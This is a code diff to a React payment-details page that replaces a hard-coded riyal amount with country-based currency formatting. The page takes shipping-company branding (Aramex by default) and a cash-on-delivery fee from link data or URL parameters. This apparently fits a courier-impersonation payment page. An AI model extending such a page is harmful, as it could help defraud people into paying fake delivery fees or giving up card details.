@@ -3,19 +3,25 @@ import { Button } from "@/components/ui/button";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
+import { getCountryByCode } from "@/lib/countries";
+import { formatCurrency } from "@/lib/countryCurrencies";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
 
 const PaymentDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
-  
+
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
+
+  // Get country code from link data
+  const countryCode = shippingInfo?.selectedCountry || "SA";
+
   const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
+  const formattedAmount = formatCurrency(amount, countryCode);
   
   const handleProceed = () => {
     // Check payment method from link data
@@ -62,7 +68,7 @@ const PaymentDetails = () => {
               <div className="flex items-center gap-2">
                 <DollarSign className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground" />
                 <span className="text-muted-foreground">مبلغ COD:</span>
-                <span className="font-semibold">{shippingInfo.cod_amount} ر.س</span>
+                <span className="font-semibold">{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
               </div>
             )}
           </div>
